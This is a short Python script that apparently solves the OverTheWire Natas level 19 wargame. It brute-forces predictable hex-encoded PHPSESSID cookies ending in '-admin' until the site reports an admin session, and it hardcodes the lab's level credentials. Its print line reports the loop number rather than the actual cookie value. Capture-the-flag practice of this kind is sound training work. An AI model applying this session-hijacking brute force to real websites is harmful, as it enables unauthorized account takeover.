#!/bin/python3

import requests

url = "http://natas19.natas.labs.overthewire.org/index.php"
auth = ("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr") #Replace with target creds

for session_id in range(1, 641):
	format_session_id = str(session_id)+'-admin'
	encode_session_id = format_session_id.encode('utf-8').hex()
	#print(f"Current cookie: {encode_session_id}")
	cookies = {"PHPSESSID":str(encode_session_id)}
	response = requests.get(url, auth=auth, cookies=cookies)
	
	if "You are an admin" in response.text:
		print(f"Admin session found! PHPSESSID={session_id}")
		print(response.text)
		break
		
		
